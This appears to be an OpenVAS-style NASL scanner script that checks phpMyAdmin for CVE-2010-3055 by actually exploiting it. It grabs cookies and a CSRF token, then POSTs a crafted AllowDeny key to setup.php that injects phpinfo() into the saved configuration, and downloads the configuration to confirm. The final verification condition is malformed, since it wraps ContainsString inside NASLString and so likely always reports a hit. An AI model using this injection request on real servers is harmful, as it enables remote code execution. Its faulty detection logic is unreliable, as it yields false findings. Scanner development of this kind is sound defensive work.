CPE = "cpe:/a:phpmyadmin:phpmyadmin";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.100760" );
	script_version( "2020-06-09T14:44:58+0000" );
	script_bugtraq_id( 42591 );
	script_cve_id( "CVE-2010-3055" );
	script_tag( name: "last_modification", value: "2020-06-09 14:44:58 +0000 (Tue, 09 Jun 2020)" );
	script_tag( name: "creation_date", value: "2010-08-30 14:30:07 +0200 (Mon, 30 Aug 2010)" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_name( "phpMyAdmin 'CVE-2010-3055' Configuration File PHP Code Injection Vulnerability" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2010 Greenbone Networks GmbH" );
	script_dependencies( "secpod_phpmyadmin_detect_900129.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "phpMyAdmin/installed" );
	script_xref( name: "URL", value: "https://www.securityfocus.com/bid/42591" );
	script_xref( name: "URL", value: "http://www.phpmyadmin.net/home_page/security/PMASA-2010-4.php" );
	script_tag( name: "summary", value: "phpMyAdmin is prone to a remote PHP code-injection vulnerability." );
	script_tag( name: "impact", value: "An attacker can exploit this issue to inject and execute arbitrary PHP
  code in the context of the webserver process. This may facilitate a compromise of the application and
  the underlying computer. Other attacks are also possible." );
	script_tag( name: "affected", value: "Versions prior to phpMyAdmin 2.11.10.1 are affected." );
	script_tag( name: "solution", value: "Vendor updates are available. Please see the references for more
  information." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("version_func.inc.sc");
require("host_details.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!infos = get_app_version_and_location( cpe: CPE, port: port, exit_no_version: FALSE )){
	exit( 0 );
}
vers = infos["version"];
dir = infos["location"];
if(vers){
	if(!version_in_range( version: vers, test_version: "2.11", test_version2: "2.11.10" )){
		exit( 0 );
	}
}
if(!dir){
	exit( 0 );
}
url = NASLString( dir, "/scripts/setup.php" );
req = http_get( item: url, port: port );
buf = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
if(!ContainsString( buf, "<title>phpMyAdmin" )){
	exit( 0 );
}
if(ContainsString( buf, "Can not load or save configuration" )){
	data = NASLString( "The installed version (", vers, ") of phpMyAdmin under ", dir, " is affected, but the vulnerability could not be exploited at this time because the Webserver has no permission to write the configuration to the 'config' directory.\\n\\n" );
	security_message( port: port, data: data );
	exit( 0 );
}
h = split( buf );
for r in h {
	if(IsMatchRegexp( r, "^Set-Cookie" )){
		if( !first_cookie ){
			cookies_string += ereg_replace( string: r, pattern: "^Set-Cookie", replace: "Cookie" );
			cookies_string = chomp( cookies_string );
			first_cookie = TRUE;
		}
		else {
			cookies_string += ereg_replace( string: r, pattern: "^Set-Cookie:", replace: ";" );
			cookies_string = chomp( cookies_string );
		}
	}
}
token = eregmatch( pattern: "input type=\"hidden\" name=\"token\" value=\"([^\"]+)\"", string: buf );
if(isnull( token[1] )){
	exit( 0 );
}
token = token[1];
host = this_host() + "-" + rand();
php = "phpinfo()";
postdata = NASLString( "token=", token, "&action=addserver_real&host=", host, "&submit_save=Add&AllowDeny_order=1&AllowDeny[a][b]['.", php, ".']=1" );
req = NASLString( "POST ", url, " HTTP/1.1\\r\\n", "Host: ", get_host_name(), "\\r\\n", cookies_string, "\\r\\n", "Content-Type: application/x-www-form-urlencoded\\r\\n", "Content-Length: ", strlen( postdata ), "\\r\\n", "\\r\\n", postdata );
res = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
if(!ContainsString( res, "New server added" ) || !ContainsString( res, host )){
	exit( 0 );
}
postdata = NASLString( "token=", token, "&action=download" );
req = NASLString( "POST ", url, " HTTP/1.1\\r\\n", "Host: ", get_host_name(), "\\r\\n", cookies_string, "\\r\\n", "Content-Type: application/x-www-form-urlencoded\\r\\n", "Content-Length: ", strlen( postdata ), "\\r\\n", "\\r\\n", postdata );
res = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
if(NASLString( "$cfg['Servers'][$i]['AllowDeny']['order']['a']['b'][''.", php, ContainsString( res, ".''] = '1';" ) )){
	security_message( port: port );
	exit( 0 );
}
exit( 99 );

